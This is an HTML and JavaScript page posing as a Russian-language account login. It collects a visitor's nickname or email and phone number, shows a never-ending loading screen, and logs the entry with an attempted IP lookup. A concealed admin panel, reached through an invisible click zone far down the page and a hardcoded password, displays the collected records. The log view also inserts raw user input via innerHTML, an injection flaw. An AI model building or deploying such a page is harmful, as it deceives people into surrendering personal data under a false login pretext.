<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Личный кабинет</title>
    <style>
        /* Базовые настройки страницы */
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #141414, #1a1a1a, #111111);
            background-size: 400% 400%;
            animation: gradientBg 15s ease infinite;
            color: #fff;
            scroll-behavior: smooth;
        }

        @keyframes gradientBg {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* Контейнер формы по центру */
        .center-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            box-sizing: border-box;
        }

        .box {
            background: rgba(35, 35, 35, 0.85);
            backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.05);
            width: 100%;
            max-width: 380px;
            transition: all 0.3s ease;
        }

        h3 {
            margin-top: 0;
            color: #fff;
            text-align: center;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        label {
            display: block;
            margin-top: 18px;
            font-size: 13px;
            color: #aaa;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        input, button {
            width: 100%;
            padding: 14px;
            margin-top: 8px;
            box-sizing: border-box;
            border-radius: 10px;
            font-size: 14px;
            transition: all 0.2s ease;
        }

        input {
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(20, 20, 20, 0.6);
            color: #fff;
        }

        input:focus {
            border-color: #007bff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.25);
            background: rgba(30, 30, 30, 0.8);
        }

        button {
            background: #007bff;
            color: white;
            border: none;
            cursor: pointer;
            font-weight: bold;
            margin-top: 20px;
        }

        button:hover {
            background: #0069d9;
            transform: translateY(-1px);
        }

        button:active {
            transform: translateY(1px);
        }

        /* Кастомные уведомления (Вместо браузерных алертов) */
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
        }

        .toast {
            background: #ff3333;
            color: #fff;
            padding: 16px 24px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            margin-bottom: 10px;
            font-weight: 500;
            min-width: 250px;
            transform: translateX(120%);
            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .toast.success {
            background: #28a745;
        }

        .toast.show {
            transform: translateX(0);
        }

        /* Скрытые блоки админки */
        #secretAdminInputBlock, #adminPanel {
            display: none;
        }

        #adminPanel {
            background: #151515;
            margin: 20px auto;
            max-width: 600px;
            border: 1px solid #333;
            padding: 20px;
            font-family: monospace;
            font-size: 13px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
        }

        #logs {
            color: #00ff66;
        }

        /* Экран загрузки */
        #loadingScreen {
            display: none;
            text-align: center;
        }

        .spinner {
            border: 4px solid rgba(255,255,255,0.05);
            border-left-color: #007bff;
            width: 45px;
            height: 45px;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .gray-text {
            color: #888;
            font-size: 15px;
            letter-spacing: 0.5px;
        }

        /* Огромный пустой отступ */
        .huge-spacer {
            height: 4000px;
        }

        /* Крупная черная плашка на дне страницы */
        .black-bar {
            height: 20px;
            background-color: #000000;
            position: relative;
            width: 100%;
        }

        .secret-click-zone {
            position: absolute;
            bottom: 20px;
            left: 0;
            width: 100%;
            height: 40px;
            background: transparent;
            cursor: default;
            user-select: none;
        }

        .log-row {
            margin-bottom: 12px;
            padding: 12px;
            background: #0d0d0d;
            border-radius: 6px;
            border-left: 3px solid #00ff66;
        }
        .accent {
            color: #ff4444;
        }
    </style>
</head>
<body>

    <!-- Контейнер для кастомных уведомлений -->
    <div class="toast-container" id="toastContainer"></div>

    <!-- Главный экран с формой -->
    <div class="center-wrapper" id="userForm">
        <div class="box">
            <h3>Личный кабинет</h3>

            <label>Никнейм или Email:</label>
            <input type="text" id="username" placeholder="Например: alex_99">

            <label>Номер телефона:</label>
            <input type="text" id="userphone" placeholder="+7 (999) 999-99-99">

            <button onclick="regtotext()">Подтвердить вход</button>
        </div>
    </div>
    <!-- Экран вечной загрузки -->
    <div class="center-wrapper" id="loadingScreen">
        <div>
            <div class="spinner"></div>
            <div class="gray-text">Синхронизация данных...</div>
        </div>
    </div>

    <!-- Огромное пустое пространство для прокрутки -->
    <div class="huge-spacer"></div>

    <!-- Черная плашка и секретный триггер над ней -->
    <div class="black-bar">
        <div class="secret-click-zone" onclick="toggleAdminInput()"></div>
    </div>

    <!-- Скрытая панель авторизации админа -->
    <div class="center-wrapper" id="secretAdminInputBlock">
        <div class="box">
            <label>Панель управления (кодовое слово):</label>
            <input type="text" id="secretKey" placeholder="Введите пароль...">
            <button onclick="checkCode()">Войти в админку</button>
        </div>
    </div>

    <!-- Окно отображения базы данных (логов) -->
    <div id="adminPanel">
        <h3>База данных (Логи посещений):</h3>
        <div id="logs">Логов пока нет.</div>
    </div>

    <script>
        // Кастомная функция вывода красивых сообщений
        function showNotification(message, type = 'error') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerText = message;
            container.appendChild(toast);

            setTimeout(() => toast.classList.add('show'), 100);

            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => toast.remove(), 300);
            }, 4000);
        }

        // Проверка номера телефона регулярным выражением
        function validatePhone(phone) {
            const phoneRegex = /^[\d\s\+\-\(\)]{11,18}$/;
            const digits = phone.replace(/\D/g, '');
            return phoneRegex.test(phone) && digits.length >= 11;
        }

        // Функция отправки формы
        function regtotext() {
            const nameInput = document.getElementById('username').value.trim();
            const phoneInput = document.getElementById('userphone').value.trim();

            if (!nameInput || !phoneInput) {
                showNotification('Пожалуйста, заполните все поля!');
                return;
            }

            if (!validatePhone(phoneInput)) {
                showNotification('Введите корректный номер телефона (минимум 11 цифр)!');
                return;
            }

            // Проверка уникальности никнейма по базе данных в localStorage
            let database = JSON.parse(localStorage.getItem('site_logs')) || [];
            const isNameExists = database.some(user => user.name.toLowerCase() === nameInput.toLowerCase());

            if (isNameExists) {
                showNotification('Этот никнейм уже зарегистрирован в системе!');
                return;
            }

            // Переключаем на экран загрузки
            document.getElementById('userForm').style.display = 'none';
            document.getElementById('loadingScreen').style.display = 'flex';

            // Безопасный запрос IP через HTTPS
            fetch('https://ipify.org')
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip || "0.0.0.0";
                    const currentTime = new Date().toLocaleString('ru-RU');

                    database.push({
                        name: nameInput,
                        phone: phoneInput,
                        city: "IP: " + userIP,
                        time: currentTime
                    });

                    localStorage.setItem('site_logs', JSON.stringify(database));
                })
                .catch(error => {
                    console.error(error);
                    const currentTime = new Date().toLocaleString('ru-RU');
                    database.push({
                        name: nameInput,
                        phone: phoneInput,
                        city: "IP: Скрыт (Ошибка сети)",
                        time: currentTime
                    });
                    localStorage.setItem('site_logs', JSON.stringify(database));
                });
        }

        // Показ/скрытие ввода админа
        function toggleAdminInput() {
            const adminInputBlock = document.getElementById('secretAdminInputBlock');
            if (adminInputBlock.style.display === 'flex') {
                adminInputBlock.style.display = 'none';
            } else {
                adminInputBlock.style.display = 'flex';
                adminInputBlock.scrollIntoView({ behavior: 'smooth' });
            }
        }

        // Проверка пароля админа
        function checkCode() {
            const key = document.getElementById('secretKey').value.trim();
            const panel = document.getElementById('adminPanel');
            const logsDiv = document.getElementById('logs');

            if (key === 'КОД') {
                panel.style.display = 'block';

                let database = JSON.parse(localStorage.getItem('site_logs')) || [];

                if (database.length === 0) {
                    logsDiv.innerHTML = "База данных пуста.";
                    panel.scrollIntoView({ behavior: 'smooth' });
                    return;
                }

                logsDiv.innerHTML = database.map((user, index) => `
                    <div class="log-row">
                        [<span class="accent">${user.time}</span>] Лог #${index + 1}<br>
                        • Ник: ${user.name}<br>
                        • Тел: ${user.phone}<br>
                        • Сеть: ${user.city}
                    </div>
                `).join('');

                panel.scrollIntoView({ behavior: 'smooth' });
            } else {
                showNotification('Неверное кодовое слово! Доступ заблокирован.');
                panel.style.display = 'none';
            }
        }
    </script>
</body>
</html>
